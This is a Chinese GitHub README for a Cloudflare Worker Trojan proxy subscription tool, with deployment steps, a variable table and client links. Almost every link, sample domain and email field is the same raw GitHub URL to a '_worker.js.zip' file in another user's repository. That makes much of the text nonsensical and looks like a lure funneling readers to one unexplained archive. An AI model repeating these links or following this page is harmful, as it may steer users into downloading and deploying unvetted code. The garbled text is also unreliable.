# [am-cf-trojan](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
这是基于CF平台的脚本，部署Trojan 配置信息转换为订阅内容。可以方便地将 Trojan 节点配置信息转换到 Clash 或 Singbox 或Quantumult X等工具中。

#
▶️ **新人[YouTube](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)** 需要您的支持，请务必帮我**点赞**、**关注**、**打开小铃铛**，***十分感谢！！！*** ✅
</br>🎁请 **follow** 我的[GitHub](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)、给我所有项目一个 **Star** 星星（拜托了）！你的支持是我不断前进的动力！ 💖
</br>✅**解锁更多技能** [加入TG群【am_clubs】](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)、[YouTube频道【@am_clubs】](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)、[【博客(国内)】](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)、[【博客(国际)】](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) 
</br>✅点击观看教程[CLoudflare免费节点](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [VPS搭建节点](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [获取免费域名](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [免费VPN](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [IPTV源](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [Mac和Win工具](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [AI分享](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)

# 推荐视频教程
- [Error 1101 和 522 报错解决方案教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [优选IP和优选反代IP视频教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [解决常见订阅测试-1问题教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
- [trojan免费节点部署教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [Trojan免费节点部署教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [从入门到精通免费部署教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [聚合节点订阅教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
- [GitHub私有库存储优选IP文教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [CF免费KV存储优选IP文件教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) [获取免费域名教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [获取CF自家域名无限节点](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)

### CF端口类型:
~~~
HTTP：80，8080，8880，2052，2082，2086，2095
HTTPS：443，2053，2083，2087，2096，8443
~~~

## Workers 部署方法 [视频教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
<details>
<summary>点击展开/收起</summary>
	
1. 部署 Cloudflare Worker：
   - 在 Cloudflare Worker 控制台中创建一个新的 Worker。
   - 将 [https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) 的内容粘贴到 Worker 编辑器中。
2. 给 workers绑定 自定义域： [免费域名申请教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
   - 在 workers控制台的 `设置` 选项卡 -> 点击 `域和路由` -> 右方点击 -> `添加` -> 选择 `自定义域`。
   - 填入你已转入 CloudFlare 域名 (https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) 解析服务的次级域名，例如:`https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip`后 点击 `添加域`，等待证书生效即可。
3. 给PASSWORD设置KV存储桶(可选项，推荐设置)： 
   - 在 CloudFlare主页的左边菜单的 ` 存储和数据库` 选项卡 -> 展开选择点击 `KV` -> 右方点击 -> `创建` -> 填入 `命名空间名称`(此名称自己命名) 后 -> 点击 `添加`。(此步已有可忽略)
   - 在 workers控制台的 `设置` 选项卡 -> 点击 `绑定` -> 右方点击 -> `添加` -> 选择 `KV 命名空间` -> 变量名称 填入 `amclubs`(此名称固定不能变) -> KV 命名空间 选择 在上面创建的 `命名空间名称`后 -> 右下方点击 `部署`。
4. 访问订阅内容：
   - 访问 `https://[YOUR-WORKERS-URL]/[PASSWORD]` 即可获取订阅内容（默认PASSWORD是：auto）。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` 就是你的通用自适应订阅地址(Quantumult X、Clash、singbox、小火箭、v2rayN、v2rayU、surge、PassWall、SSR+、Karing等)。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` Base64订阅格式，适用PassWall,SSR+等。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` Clash订阅格式，适用OpenClash等。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` singbox订阅格式，适用singbox等。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` 自动义变量等参数。
5. 修改默认PASSWORD变量，使用KV存储桶(可选项，推荐修改，防止别人用你节点)： 
   - 访问 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` 即可进入修改PASSWORD页面 
   - 在PASSWORD页面PASSWORD项 -> 填入 `新的PASSWORD` 后 -> 点击 `Save`。
   - 保存成功后，原PASSWORD已作废不能访问，用新PASSWORD访问  `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip新的PASSWORD` 即可获取订阅内容。

</details>

## Pages 上传 部署方法 [视频教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
<details>
<summary>点击展开/收起</summary>
	
1. 部署 Cloudflare Pages：
   - 下载 [https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) 文件，并点上 Star !!!
   - 在 Cloudflare Pages 控制台中选择 `上传资产`后，为你的项目取名后点击 `创建项目`，然后上传你下载好的 [https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) 文件后点击 `部署站点`。
2. 给 Pages绑定 CNAME自定义域：[无域名绑定Cloudflare部署视频教程]->[免费域名教程1](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) [免费域名教程2](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)  [免费域名教程3](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
   - 在 Pages控制台的 `自定义域`选项卡，下方点击 `设置自定义域`。
   - 填入你的自定义次级域名，注意不要使用你的根域名，例如：
     您分配到的域名是 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip`，则添加自定义域填入 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip`即可，点击 `激活域`即可。    
3. 给PASSWORD设置KV存储桶(可选项，推荐设置)： 
   - 在 CloudFlare主页的左边菜单的 ` 存储和数据库` 选项卡 -> 展开选择点击 `KV` -> 右方点击 -> `创建` -> 填入 `命名空间名称`(此名称自己命名) 后 -> 点击 `添加`。(此步已有可忽略)
   - 在 workers控制台的 `设置` 选项卡 -> 点击 `绑定` -> 右方点击 -> `添加` -> 选择 `KV 命名空间` -> 变量名称 填入 `amclubs`(此名称固定不能变) -> KV 命名空间 选择 在上面创建的 `命名空间名称`后 -> 右下方点击 `部署`。
   - 在 `设置` 选项卡，在右上角点击 `创建部署` 后，重新上传 [https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) 文件后点击 `保存并部署` 即可。
4. 访问订阅内容：
   - 访问 `https://[YOUR-WORKERS-URL]/[PASSWORD]` 即可获取订阅内容（默认PASSWORD是：auto）。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` 就是你的通用自适应订阅地址(Quantumult X、Clash、singbox、小火箭、v2rayN、v2rayU、surge、PassWall、SSR+、Karing等)。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` Base64订阅格式，适用PassWall,SSR+等。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` Clash订阅格式，适用OpenClash等。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` singbox订阅格式，适用singbox等。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` 自动义变量等参数。
5. 修改默认PASSWORD变量，使用KV存储桶(可选项，推荐修改，防止别人用你节点)： 
   - 访问 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` 即可进入修改PASSWORD页面 
   - 在PASSWORD页面PASSWORD项 -> 填入 `新的PASSWORD` 后-> 点击 `Save`。
   - 保存成功后，原PASSWORD已作废不能访问，用新PASSWORD访问  `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip新的PASSWORD` 即可获取订阅内容。

</details>

## Pages GitHub 部署方法 [视频教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
<details>
<summary>点击展开/收起</summary>
	
1. 部署 Cloudflare Pages：
   - 在 Github 上先 Fork 本项目，并点上 Star !!!
   - 在 Cloudflare Pages 控制台中选择 `连接到 Git`后，选中 `am-cf-tunnel`项目后点击 `开始设置`。
   - 在 `设置构建和部署`页面下方，后点击 `保存并部署`即可。
2. 给 Pages绑定 CNAME自定义域：[无域名绑定Cloudflare部署视频教程]->[免费域名教程1](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) [免费域名教程2](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)  [免费域名教程3](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
   - 在 Pages控制台的 `自定义域`选项卡，下方点击 `设置自定义域`。
   - 填入你的自定义次级域名，注意不要使用你的根域名，例如：
     您分配到的域名是 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip`，则添加自定义域填入 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip`即可，点击 `激活域`即可。    
3. 给PASSWORD设置KV存储桶(可选项，推荐设置)： 
   - 在 CloudFlare主页的左边菜单的 ` 存储和数据库` 选项卡 -> 展开选择点击 `KV` -> 右方点击 -> `创建` -> 填入 `命名空间名称`(此名称自己命名) 后 -> 点击 `添加`。(此步已有可忽略)
   - 在 workers控制台的 `设置` 选项卡 -> 点击 `绑定` -> 右方点击 -> `添加` -> 选择 `KV 命名空间` -> 变量名称 填入 `amclubs`(此名称固定不能变) -> KV 命名空间 选择 在上面创建的 `命名空间名称`后 -> 右下方点击 `部署`。
   - 在 `设置` 选项卡，在右上角点击 `创建部署` 后，重新选择 `部署` 即可。
4. 访问订阅内容：
   - 访问 `https://[YOUR-WORKERS-URL]/[PASSWORD]` 即可获取订阅内容（默认PASSWORD是：auto）。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` 就是你的通用自适应订阅地址(Quantumult X、Clash、singbox、小火箭、v2rayN、v2rayU、surge、PassWall、SSR+、Karing等)。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` Base64订阅格式，适用PassWall,SSR+等。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` Clash订阅格式，适用OpenClash等。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` singbox订阅格式，适用singbox等。
   - 例如 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` 自动义变量等参数。
5. 修改默认PASSWORD变量，使用KV存储桶(可选项，推荐修改，防止别人用你节点)： 
   - 访问 `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip` 即可进入修改PASSWORD页面 
   - 在PASSWORD页面PASSWORD项 -> 填入 `新的PASSWORD` 后 -> 点击 `Save`。
   - 保存成功后，原PASSWORD已作废不能访问，用新PASSWORD访问  `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip新的PASSWORD` 即可获取订阅内容。

</details>

## 变量说明 [视频教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
| 变量名 | 示例 | 必填 | 备注 | YT |
|-----|-----|-----|-----|-----|
| PASSWORD         | auto （默认值）               |✅| 节点的密码，可以取任意值                                       |  |
| PROXYIP          | https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip </br>或</br> [https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |❌| 访问CloudFlare的CDN代理节点(支持多ProxyIP, ProxyIP之间使用`,`或 换行 作间隔),支持端口设置默认443 如: https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip 支持远程txt和csv文件 | [Video](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |
| SOCKS5           | user:password@127.0.0.1:1080         |❌| 优先作为访问CFCDN站点的SOCKS5代理                                                   | [Video](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |
| DNS_RESOLVER_URL | https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip |❌| DNS解析获取作用，小白勿用                                                           |  |
| IP_LOCAL         | `https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip官方优选域名`           |❌| （不推荐）本地优选域名/优选IP(支持多元素之间`,`或 换行 作间隔)                                 | |
| IP_URL           | [https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)           |❌| （推荐）优选(ipv4、ipv6、域名、API)地址(支持多个之间`,`或 换行 作间隔)，支持文件连接后里带PROXYIP参数，可以实现不同区域优先IP使用不同的PROXYIP固定区域，解决IP乱跳问题  | [教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)|
| IP_URL_TXT       | [https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |❌| （不推荐）优选ipv4、ipv6、域名、API地址(支持多个之间`,`或 换行 作间隔) |[教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) [教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)|
| IP_URL_CSV       | [https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |❌| （不推荐）优选ipv4/6的IP测速结果(支持多元素, 元素之间使用`,`作间隔) |[教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)|
| NO_TLS           | true/false                           |❌| 默认false,是否开启TLS系列端口，只有workers部署才可以使非用TLS系列端口             | |
| SL               | 5                                    |❌| `CSV`文件里的测速结果满足速度下限                                                     ||
| SUB_CONFIG       | [https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |❌| clash、singbox等 订阅转换配置文件  ||
| SUB_CONVERTER    | https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip                    |❌| clash、singbox等 订阅转换后端的api地址                               ||
| SUB_NAME         | AM科技                             |❌ | 订阅名称                                                     ||
| CF_EMAIL         | https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip                       |❌| CF账户邮箱(要和`CF_KEY`同时填才生效, 订阅信息将显示请求使用量, 小白别用)                        ||
| CF_KEY          | c6a944b5c9c18c235288bced8b85e         |❌| CF账户Global API Key(要和`CF_EMAIL`同时填才生效, 订阅信息将显示请求使用量, 小白别用)           ||
| TG_TOKEN        | 6823456:XXXXXXX0qExVUhHDAbXXXqWXgBA   |❌| 发送TG通知的机器人token                       ||
| TG_ID           | 6946912345                            |❌ | 接收TG通知的账户数字ID                                       ||

## 五、已适配订阅工具 [点击进入视频教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) [点进进入karing视频教程](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
- Mac（苹果电脑）
   - [v2rayU](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [clash-verge-rev](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [Quantumult X](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |  [小火箭](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [surge](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [karing](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [sing-box](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)  | [Clash Nyanpasu](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [openclash](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [Hiddify](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)

- Win（win系统电脑）
   - [v2rayN](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |  [clash-verge-rev](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [sing-box](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |  [Clash Nyanpasu](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [openclash](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)  | [karing](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |  [Hiddify](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
     
- IOS（苹果手机）
   - [clash-verge-rev](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |  [Quantumult X](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)  |  [小火箭](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)  |  [surge](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |  [sing-box](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [Clash Nyanpasu](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [karing](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [Hiddify](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
     
- Android（安卓手机）
   - [v2rayNG](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |  [clash-verge-rev](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [sing-box](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |  [Clash Nyanpasu](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) |  [karing](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip) | [Hiddify](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)

- 软路由
   - [openclash(https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)](https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip)
  
 # 
<center>
<details><summary><strong> [点击展开] 赞赏支持 ~🧧</strong></summary>
*我非常感谢您的赞赏和支持，它们将极大地激励我继续创新，持续产生有价值的工作。*

- **USDT-TRC20:** `TWTxUyay6QJN3K4fs4kvJTT8Zfa2mWTwDD`
- **TRX-TRC20:** `TWTxUyay6QJN3K4fs4kvJTT8Zfa2mWTwDD`

<div align="center"> 
  <img src="https://raw.githubusercontent.com/robbiechen1969/am-cf-trojan/main/_worker.js.zip" width="200"></br> 
  TRC10/TRC20扫码支付 
</div> 
</details>
</center>

 #
 免责声明:
 - 1、该项目设计和开发仅供学习、研究和安全测试目的。请于下载后 24 小时内删除, 不得用作任何商业用途, 文字、数据及图片均有所属版权, 如转载须注明来源。
 - 2、使用本程序必循遵守部署服务器所在地区的法律、所在国家和用户所在国家的法律法规。对任何人或团体使用该项目时产生的任何后果由使用者承担。
 - 3、作者不对使用该项目可能引起的任何直接或间接损害负责。作者保留随时更新免责声明的权利，且不另行通知。
 
